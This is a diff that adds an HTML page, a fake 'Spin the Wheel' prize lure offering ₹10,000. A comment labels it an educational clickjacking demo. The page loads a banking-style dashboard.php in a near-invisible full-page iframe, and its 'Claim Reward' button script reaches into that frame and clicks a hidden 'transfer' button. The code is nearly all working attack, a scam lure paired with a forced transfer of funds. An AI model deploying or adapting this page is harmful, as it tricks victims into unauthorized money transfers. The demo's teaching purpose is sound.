@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prize Spin Wheel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .wheel {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: conic-gradient(
+                #ff6b6b 0deg 72deg,
+                #4ecdc4 72deg 144deg,
+                #45b7d1 144deg 216deg,
+                #f9ca24 216deg 288deg,
+                #6c5ce7 288deg 360deg
+            );
+            margin: 20px auto;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            transition: transform 4s ease-out;
+        }
+        .wheel::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-bottom: 20px solid red;
+        }
+        .spin-btn {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px;
+        }
+        .claim-btn {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px;
+            display: none;
+        }
+        iframe {
+            opacity: 0.01;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎡 Spin the Wheel to Win!</h1>
+        <p>Spin the wheel and claim your ₹10,000 reward!</p>
+        <div class="wheel" id="wheel">
+            ₹10,000
+        </div>
+        <button class="spin-btn" onclick="spinWheel()">Spin the Wheel</button>
+        <button class="claim-btn" id="claimBtn">🎁 Claim Reward</button>
+        
+        <!-- Educational clickjacking demo - do not use in production -->
+        <iframe src="dashboard.php"></iframe>
+    </div>
+
+    <script>
+        let hasSpun = false;
+        function spinWheel() {
+            if (hasSpun) return;
+            hasSpun = true;
+            const wheel = document.getElementById('wheel');
+            const degrees = 360 * 5 + 72; // Spin 5 times + stop at prize
+            wheel.style.transform = `rotate(${degrees}deg)`;
+            setTimeout(() => {
+                document.getElementById('claimBtn').style.display = 'inline-block';
+            }, 4000);
+        }
+
+        document.getElementById('claimBtn').addEventListener('click', function() {
+            const iframe = document.querySelector('iframe');
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            const realButton = iframeDoc.querySelector('button[name="transfer"]');
+            if (realButton) {
+                realButton.click();
+                alert('Amount debited from your bank account!');
+            }
+        });
+    </script>
+</body>
+</html>
